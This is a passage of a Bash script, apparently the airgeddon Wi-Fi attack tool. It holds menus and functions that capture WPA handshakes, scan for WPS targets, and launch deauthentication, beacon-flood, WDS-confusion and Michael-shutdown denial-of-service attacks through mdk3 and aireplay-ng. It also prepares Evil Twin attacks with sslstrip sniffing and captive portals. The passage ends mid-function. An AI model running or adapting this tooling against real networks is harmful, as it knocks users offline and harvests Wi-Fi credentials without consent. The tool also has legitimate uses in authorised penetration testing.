function convert_cap_to_hashcat_format() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	if [ "${hccapx_needed}" -eq 0 ]; then
		echo "1" | aircrack-ng "${enteredpath}" -J "${tmpdir}${hashcat_tmp_simple_name_file}" -b "${bssid}" > /dev/null 2>&1
		return 0
	else
		hccapx_converter_found=0
		if hash ${hccapx_tool} 2> /dev/null; then
			hccapx_converter_found=1
			hccapx_converter_path="${hccapx_tool}"
		else
			for item in "${possible_hccapx_converter_known_locations[@]}"; do
				if [ -f "${item}" ]; then
					hccapx_converter_found=1
					hccapx_converter_path="${item}"
					break
				fi
			done
		fi

		if [ "${hccapx_converter_found}" -eq 1 ]; then
			hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccapx"
			"${hccapx_converter_path}" "${enteredpath}" "${tmpdir}${hashcat_tmp_file}" > /dev/null 2>&1
			return 0
		else
			echo
			language_strings "${language}" 436 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi
}

#Handshake tools menu
function handshake_tools_menu() {

	debug_print

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 121
	print_simple_separator
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	print_simple_separator
	language_strings "${language}" 123
	print_hint ${current_menu}

	read -r handshake_option
	case ${handshake_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			capture_handshake
		;;
		6)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		7)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_tools_menu
}

#Execute the cleaning of a Handshake file
function exec_clean_handshake_file() {

	debug_print

	echo
	if ! check_valid_file_to_clean "${filetoclean}"; then
		language_strings "${language}" 159 "yellow"
	else
		wpaclean "${filetoclean}" "${filetoclean}" > /dev/null 2>&1
		language_strings "${language}" 153 "yellow"
	fi
	language_strings "${language}" 115 "read"
}

#Validate and ask for the parameters used to clean a Handshake file
function clean_handshake_file_option() {

	debug_print

	echo
	readpath=0

	if [ -z "${enteredpath}" ]; then
		language_strings "${language}" 150 "blue"
		readpath=1
	else
		language_strings "${language}" 151 "blue"
		ask_yesno 152 "yes"
		if [ "${yesno}" = "y" ]; then
			filetoclean="${enteredpath}"
		else
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	exec_clean_handshake_file
}

#DoS attacks menu
function dos_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 102 "title"
	current_menu="dos_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 51 mdk3_attack_dependencies[@]
	language_strings "${language}" 52 aireplay_attack_dependencies[@]
	language_strings "${language}" 53 mdk3_attack_dependencies[@]
	language_strings "${language}" 54 "separator"
	language_strings "${language}" 62 mdk3_attack_dependencies[@]
	language_strings "${language}" 63 mdk3_attack_dependencies[@]
	language_strings "${language}" 64 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 59
	print_hint ${current_menu}

	read -r dos_option
	case ${dos_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				mdk3_deauth_option
			fi
		;;
		6)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aireplay_deauth_option
			fi
		;;
		7)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wds_confusion_option
			fi
		;;
		8)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				beacon_flood_option
			fi
		;;
		9)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				auth_dos_option
			fi
		;;
		10)
			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				michael_shutdown_option
			fi
		;;
		11)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac
	
	dos_attacks_menu
}

#Capture Handshake on Evil Twin attack
function capture_handshake_evil_twin() {

	debug_print

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	capture_handshake_window

	case ${et_dos_attack} in
		"Mdk3")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
			sleeptimeattack=12
		;;
		"Aireplay")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
			sleeptimeattack=12
		;;
		"Wds Confusion")
			recalculate_windows_sizes
			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
			sleeptimeattack=16
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	ask_yesno 145
	handshake_captured=${yesno}
	kill "${processidcapture}" &> /dev/null
	if [ "${handshake_captured}" = "y" ]; then

		handshakepath="${default_save_path}"
		lastcharhandshakepath=${handshakepath: -1}
		if [ "${lastcharhandshakepath}" != "/" ]; then
			handshakepath="${handshakepath}/"
		fi
		handshakefilename="handshake-${bssid}.cap"
		handshakepath="${handshakepath}${handshakefilename}"

		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "writeethandshake"
		done

		cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
		echo
		language_strings "${language}" 324 "blue"
		language_strings "${language}" 115 "read"
		return 0
	else
		echo
		language_strings "${language}" 146 "red"
		language_strings "${language}" 115 "read"
		return 2
	fi
}

#Capture Handshake on Handshake tools
function capture_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option; then
			return 1
		fi
	fi

	if ! check_monitor_enabled; then
		return 1
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	language_strings "${language}" 126 "yellow"
	language_strings "${language}" 115 "read"

	attack_handshake_menu "new"
}

#Check if file exists
function check_file_exists() {

	debug_print

	if [[ ! -f "${1}" || -z "${1}" ]]; then
		language_strings "${language}" 161 "red"
		return 1
	fi
	return 0
}

#Validate path
function validate_path() {

	debug_print

	dirname=${1%/*}

	if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
		language_strings "${language}" 156 "red"
		return 1
	fi

	if ! check_write_permissions "${dirname}"; then
		language_strings "${language}" 157 "red"
		return 1
	fi

	lastcharmanualpath=${1: -1}
	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]]; then

		if [ "${lastcharmanualpath}" != "/" ]; then
			pathname="${1}/"
		else
			pathname="${1}"
		fi

		case ${2} in
			"handshake")
				enteredpath="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"aircrackpot")
				suggested_filename="${aircrackpot_filename}"
				aircrackpotenteredpath+="${aircrackpot_filename}"
			;;
			"hashcatpot")
				suggested_filename="${hashcatpot_filename}"
				potenteredpath+="${hashcatpot_filename}"
			;;
			"ettercaplog")
				suggested_filename="${default_ettercaplogfilename}"
				ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
			;;
			"bettercaplog")
				suggested_filename="${default_bettercaplogfilename}"
				bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
			;;
			"writeethandshake")
				et_handshake="${pathname}${standardhandshake_filename}"
				suggested_filename="${standardhandshake_filename}"
			;;
			"weppot")
				suggested_filename="${weppot_filename}"
				weppotenteredpath+="${weppot_filename}"
			;;
		esac

		echo
		language_strings "${language}" 155 "yellow"
		return 0
	fi

	language_strings "${language}" 158 "yellow"
	return 0
}

#Check for write permissions on a given path
function check_write_permissions() {

	debug_print

	if [ -w "${1}" ]; then
		return 0
	fi
	return 1
}

#Create a var with the name passed to the function and reading the value from the user input
function read_and_clean_path() {

	debug_print

	settings="$(shopt -p extglob)"
	shopt -s extglob

	read -r var
	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
	[[ ${var} =~ ${regexp} ]] && var="${BASH_REMATCH[1]}"
	eval "${1}=\$var"

	eval "${settings}"
}

#Read and validate a path
function read_path() {

	debug_print

	echo
	case ${1} in
		"handshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "enteredpath"
			if [ -z "${enteredpath}" ]; then
				enteredpath="${handshakepath}"
			fi
			validate_path "${enteredpath}" "${1}"
		;;
		"cleanhandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "filetoclean"
			check_file_exists "${filetoclean}"
		;;
		"dictionary")
			language_strings "${language}" 180 "green"
			read_and_clean_path "DICTIONARY"
			check_file_exists "${DICTIONARY}"
		;;
		"targetfilefordecrypt")
			language_strings "${language}" 188 "green"
			read_and_clean_path "enteredpath"
			check_file_exists "${enteredpath}"
		;;
		"rules")
			language_strings "${language}" 242 "green"
			read_and_clean_path "RULES"
			check_file_exists "${RULES}"
		;;
		"aircrackpot")
			language_strings "${language}" 441 "green"
			read_and_clean_path "aircrackpotenteredpath"
			if [ -z "${aircrackpotenteredpath}" ]; then
				aircrackpotenteredpath="${aircrack_potpath}"
			fi
			validate_path "${aircrackpotenteredpath}" "${1}"
		;;
		"hashcatpot")
			language_strings "${language}" 233 "green"
			read_and_clean_path "potenteredpath"
			if [ -z "${potenteredpath}" ]; then
				potenteredpath="${hashcat_potpath}"
			fi
			validate_path "${potenteredpath}" "${1}"
		;;
		"ettercaplog")
			language_strings "${language}" 303 "green"
			read_and_clean_path "ettercap_logpath"
			if [ -z "${ettercap_logpath}" ]; then
				ettercap_logpath="${default_ettercap_logpath}"
			fi
			validate_path "${ettercap_logpath}" "${1}"
		;;
		"bettercaplog")
			language_strings "${language}" 398 "green"
			read_and_clean_path "bettercap_logpath"
			if [ -z "${bettercap_logpath}" ]; then
				bettercap_logpath="${default_bettercap_logpath}"
			fi
			validate_path "${bettercap_logpath}" "${1}"
		;;
		"ethandshake")
			language_strings "${language}" 154 "green"
			read_and_clean_path "et_handshake"
			check_file_exists "${et_handshake}"
		;;
		"writeethandshake")
			language_strings "${language}" 148 "green"
			read_and_clean_path "et_handshake"
			if [ -z "${et_handshake}" ]; then
				et_handshake="${handshakepath}"
			fi
			validate_path "${et_handshake}" "${1}"
		;;
		"et_captive_portallog")
			language_strings "${language}" 317 "blue"
			read_and_clean_path "et_captive_portal_logpath"
			if [ -z "${et_captive_portal_logpath}" ]; then
				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
			fi
			validate_path "${et_captive_portal_logpath}" "${1}"
		;;
		"weppot")
			language_strings "${language}" 430 "blue"
			read_and_clean_path "weppotenteredpath"
			if [ -z "${weppotenteredpath}" ]; then
				weppotenteredpath="${wep_potpath}"
			fi
			validate_path "${weppotenteredpath}" "${1}"
		;;
	esac

	validpath="$?"
	return "${validpath}"
}

#Launch the DoS selection menu before capture a Handshake and process the captured file
function attack_handshake_menu() {

	debug_print

	if [ "${1}" = "handshake" ]; then
		ask_yesno 145
		handshake_captured=${yesno}
		kill "${processidcapture}" &> /dev/null
		if [ "${handshake_captured}" = "y" ]; then

			handshakepath="${default_save_path}"
			lastcharhandshakepath=${handshakepath: -1}
			if [ "${lastcharhandshakepath}" != "/" ]; then
				handshakepath="${handshakepath}/"
			fi
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"

			language_strings "${language}" 162 "yellow"
			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "handshake"
			done

			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
			echo
			language_strings "${language}" 149 "blue"
			language_strings "${language}" 115 "read"
			return
		else
			echo
			language_strings "${language}" 146 "red"
			language_strings "${language}" 115 "read"
		fi
	fi

	clear
	language_strings "${language}" 138 "title"
	current_menu="attack_handshake_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 139 mdk3_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 147
	print_hint ${current_menu}

	read -r attack_handshake_option
	case ${attack_handshake_option} in
		1)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		2)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		3)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				recalculate_windows_sizes
				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
				sleeptimeattack=16
			fi
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
			attack_handshake_menu "new"
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	attack_handshake_menu "handshake"
}

#Launch the Handshake capture window
function capture_handshake_window() {

	debug_print

	language_strings "${language}" 143 "blue"
	echo
	language_strings "${language}" 144 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topright_window}" -T "Capturing Handshake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${tmpdir}handshake" "${interface}" > /dev/null 2>&1 &
	processidcapture=$!
}

#Manage target exploration and parse the output files
function explore_for_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled; then
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	language_strings "${language}" 67 "yellow"
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for targets" -e airodump-ng -w "${tmpdir}nws" "${interface}" > /dev/null 2>&1
	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "${tmpdir}nws-01.csv")
	targetline=$((targetline - 1))

	head -n "${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	i=0
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ _ exp_power _ _ _ exp_idlength exp_essid _; do

		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i+1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}
			if [[ "${exp_channel}" -gt 14 ]] || [[ "${exp_channel}" -lt 1 ]]; then
				exp_channel=0
			else
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
		fi
	done < "${tmpdir}nws.csv"
	sort -t "," -d -k 4 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	select_target
}

#Manage target exploration only for Access Points with WPS activated. Parse output files and print menu with results
function explore_for_wps_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled; then
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	if ! grep -qe "${interface}" <(echo "${!wash_ifaces_already_set[@]}"); then
		language_strings "${language}" 353 "blue"
		set_wash_parameterization
		language_strings "${language}" 354 "yellow"
	else
		language_strings "${language}" 355 "blue"
	fi
	echo
	language_strings "${language}" 67 "yellow"
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for WPS targets" -e "wash -i \"${interface}\" ${wash_ifaces_already_set[${interface}]} | tee \"${tmpdir}wps.txt\"" > /dev/null 2>&1

	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)

	wash_header_found=0
	wash_line_counter=1
	for item in "${WASH_PREVIEW[@]}"; do
		if [[ ${item} =~ -{20} ]]; then
			wash_start_data_line="${wash_line_counter}"
			wash_header_found=1
			break
		else
			wash_line_counter=$((wash_line_counter+1))
		fi
	done

	if [ "${wash_header_found}" -eq 0 ]; then
		echo
		language_strings "${language}" 417 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
	if [ "${washlines}" -le ${wash_start_data_line} ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 349 "green"
	print_large_separator

	i=0
	wash_counter=0
	declare -A wps_lockeds
	wps_lockeds[${wash_counter}]="No"
	while IFS=, read -r expwps_line; do

		i=$((i+1))

		if [ ${i} -le ${wash_start_data_line} ]; then
			continue
		else
			wash_counter=$((wash_counter+1))

			if [ ${wash_counter} -le 9 ]; then
				wpssp1=" "
			else
				wpssp1=""
			fi

			expwps_bssid=$(echo "${expwps_line}" | awk '{print $1}')
			expwps_channel=$(echo "${expwps_line}" | awk '{print $2}')
			expwps_power=$(echo "${expwps_line}" | awk '{print $3}')
			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
			expwps_essid=$(echo "${expwps_line}" | awk '{$1=$2=$3=$4=$5=""; print $0}' | sed -e 's/^[ \t]*//')

			if [[ ${expwps_channel} -le 9 ]]; then
				wpssp2=" "
				if [[ ${expwps_channel} -eq 0 ]]; then
					expwps_channel="-"
				fi
			else
				wpssp2=""
			fi

			if [[ "${expwps_power}" = "" ]] || [[ "${expwps_power}" = "-00" ]]; then
				expwps_power=0
			fi

			if [[ ${expwps_power} =~ ^-0 ]]; then
				expwps_power=${expwps_power//0/}
			fi

			if [[ ${expwps_power} -lt 0 ]]; then
				if [[ ${expwps_power} -eq -1 ]]; then
					exp_power=0
				else
					expwps_power=$((expwps_power + 100))
				fi
			fi

			if [[ ${expwps_power} -le 9 ]]; then
				wpssp4=" "
			else
				wpssp4=""
			fi

			wash_color="${normal_color}"
			if [ "${expwps_locked}" = "Yes" ]; then
				wash_color="${red_color}"
				wpssp3=""
			else
				wpssp3=" "
			fi

			wps_network_names[$wash_counter]=${expwps_essid}
			wps_channels[$wash_counter]=${expwps_channel}
			wps_macs[$wash_counter]=${expwps_bssid}
			wps_lockeds[$wash_counter]=${expwps_locked}
			echo -e "${wash_color} ${wpssp1}${wash_counter})   ${expwps_bssid}   ${wpssp2}${expwps_channel}    ${wpssp4}${expwps_power}%     ${expwps_locked}${wpssp3}   ${expwps_essid}"
		fi
	done < "${tmpdir}wps.txt"

	echo
	if [ ${wash_counter} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_wps_target_network=1
		language_strings "${language}" 115 "read"
	else
		print_large_separator
		language_strings "${language}" 3 "green"
		read -r selected_wps_target_network
	fi

	while [[ ! ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] || (( selected_wps_target_network < 1 || selected_wps_target_network > wash_counter )) || [[ ${wps_lockeds[${selected_wps_target_network}]} = "Yes" ]]; do

		if [[ ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] && (( selected_wps_target_network >= 1 && selected_wps_target_network <= wash_counter )); then
			if [ "${wps_lockeds[${selected_wps_target_network}]}" = "Yes" ]; then
				ask_yesno 350 "no"
				if [ "${yesno}" = "y" ]; then
					break
				else
					echo
					language_strings "${language}" 3 "green"
					read -r selected_wps_target_network
					continue
				fi
			fi
		fi

		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -r selected_wps_target_network
	done

	wps_essid=${wps_network_names[${selected_wps_target_network}]}
	wps_channel=${wps_channels[${selected_wps_target_network}]}
	wps_bssid=${wps_macs[${selected_wps_target_network}]}
	wps_locked=${wps_lockeds[${selected_wps_target_network}]}
}

#Create a menu to select target from the parsed data
function select_target() {

	debug_print

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 69 "green"
	print_large_separator
	i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i+1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2=" "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
		else
			sp2=""
		fi

		if [[ "${exp_power}" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		airodump_color="${normal_color}"
		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${yellow_color}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e "${airodump_color} ${sp1}${i})${client}  ${sp5}${exp_mac}   ${sp2}${exp_channel}    ${sp4}${exp_power}%   ${exp_enc}${sp6}   ${exp_essid}"
	done < "${tmpdir}wnws.txt"

	echo
	if [ ${i} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_target_network=1
		language_strings "${language}" 115 "read"
	else
		language_strings "${language}" 71 "yellow"
		print_large_separator
		language_strings "${language}" 3 "green"
		read -r selected_target_network
	fi

	while [[ ! ${selected_target_network} =~ ^[[:digit:]]+$ ]] || (( selected_target_network < 1 || selected_target_network > i )); do
		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -r selected_target_network
	done

	essid=${network_names[${selected_target_network}]}
	channel=${channels[${selected_target_network}]}
	bssid=${macs[${selected_target_network}]}
	enc=${encs[${selected_target_network}]}
}

#Perform a test to determine if fcs parameter is needed on wash scanning
function set_wash_parameterization() {

	debug_print

	fcs=""
	declare -gA wash_ifaces_already_set
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "${interface}" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs="-C"
			break
		fi
	done

	wash_ifaces_already_set[${interface}]=${fcs}
}

#Manage and validate the prerequisites for wps pin database attacks
function wps_pin_database_prerequisites() {

	debug_print

	set_wps_mac_parameters

	#shellcheck source=./known_pins.db
	source "${scriptfolder}${known_pins_dbfile}"

	echo
	language_strings "${language}" 384 "blue"
	echo
	search_in_pin_database
	if [ ${bssid_found_in_db} -eq 1 ]; then
		if [ ${counter_pins_found} -eq 1 ]; then
			language_strings "${language}" 385 "yellow"
		else
			language_strings "${language}" 386 "yellow"
		fi
	else
		language_strings "${language}" 387 "yellow"
	fi

	check_and_set_common_algorithms
	echo
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
}

#Manage and validate the prerequisites for Evil Twin attacks
function et_prerequisites() {

	debug_print

	if [ ${retry_handshake_capture} -eq 1 ]; then
		return
	fi

	current_menu="evil_twin_attacks_menu"
	clear

	case ${et_mode} in
		"et_onlyap")
			language_strings "${language}" 270 "title"
		;;
		"et_sniffing")
			language_strings "${language}" 291 "title"
		;;
		"et_sniffing_sslstrip")
			language_strings "${language}" 292 "title"
		;;
		"et_sniffing_sslstrip2")
			language_strings "${language}" 397 "title"
		;;
		"et_captive_portal")
			language_strings "${language}" 293 "title"
		;;
	esac

	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	print_hint ${current_menu}
	echo

	if [ "${et_mode}" != "et_captive_portal" ]; then
		language_strings "${language}" 275 "blue"
		echo
		language_strings "${language}" 276 "yellow"
		print_simple_separator
		ask_yesno 277 "yes"
		if [ "${yesno}" = "n" ]; then
			return_to_et_main_menu=1
			return_to_et_main_menu_from_beef=1
			return
		fi
	fi

	ask_yesno 419 "no"
	if [ "${yesno}" = "y" ]; then
		mac_spoofing_desired=1
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then

		language_strings "${language}" 315 "yellow"
		echo
		language_strings "${language}" 286 "pink"
		print_simple_separator
		if [ ${retrying_handshake_capture} -eq 0 ]; then
			ask_yesno 321 "no"
		fi

		if [[ ${yesno} = "n" ]] || [[ ${retrying_handshake_capture} -eq 1 ]]; then
			capture_handshake_evil_twin
			case "$?" in
				"2")
					retry_handshake_capture=1
					return
				;;
				"1")
					return_to_et_main_menu=1
					return
				;;
			esac
		else
			ask_et_handshake_file
		fi
		retry_handshake_capture=0
		retrying_handshake_capture=0
		internet_interface_selected=0

		if ! check_bssid_in_captured_file "${et_handshake}"; then
			return_to_et_main_menu=1
			return
		fi

		echo
		language_strings "${language}" 28 "blue"

		echo
		language_strings "${language}" 26 "blue"

		echo
		language_strings "${language}" 31 "blue"
	else
		if ! ask_bssid; then
			return_to_et_main_menu=1
			return
		fi
		ask_channel
		ask_essid "noverify"
	fi

	if [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
		manage_ettercap_log
	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
		manage_bettercap_log
	elif [ "${et_mode}" = "et_captive_portal" ]; then
		manage_captive_portal_log
		language_strings "${language}" 115 "read"
		set_captive_portal_language
		language_strings "${language}" 319 "blue"
	fi

	return_to_et_main_menu=1
	return_to_et_main_menu_from_beef=1

	if [ "${is_docker}" -eq 1 ]; then
		echo
		language_strings "${language}" 420 "pink"
		language_strings "${language}" 115 "read"
	fi

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"
	prepare_et_interface

	case ${et_mode} in
		"et_onlyap")
			exec_et_onlyap_attack
		;;
		"et_sniffing")
			exec_et_sniffing_attack
		;;
		"et_sniffing_sslstrip")
			exec_et_sniffing_sslstrip_attack
		;;
		"et_sniffing_sslstrip2")
			exec_et_sniffing_sslstrip2_attack
		;;
		"et_captive_portal")
			exec_et_captive_portal_attack
		;;
	esac
}

#Manage the Handshake file requirement for captive portal Evil Twin attack
function ask_et_handshake_file() {

	debug_print

	echo
	readpath=0

	if [[ -z "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 312 "blue"
		readpath=1
	elif [[ -z "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
